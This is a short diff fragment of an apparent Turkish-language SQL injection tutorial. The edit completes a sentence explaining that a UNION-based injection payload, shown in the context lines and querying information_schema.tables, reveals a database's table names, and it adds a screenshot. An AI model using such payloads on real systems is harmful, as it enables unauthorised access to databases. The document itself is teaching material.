@@ -324,9 +324,10 @@ gördüğünüz gibi tüm filmler çıktı .
 
 'and 1=0 union select 1,table_name,3,4,5,6,7 from information_schema.tables#
 
-bu komutu yazarak
+bu komutu yazarak table isimlerini ve şemaları görebiliriz.
 
 
+![photo_6030673690846410844_w](https://user-images.githubusercontent.com/110966683/184359935-e9130310-c30e-4608-bd34-c5a50acaaea1.jpg)
 
 
 gördüğünüz gibi bilgiler geldi
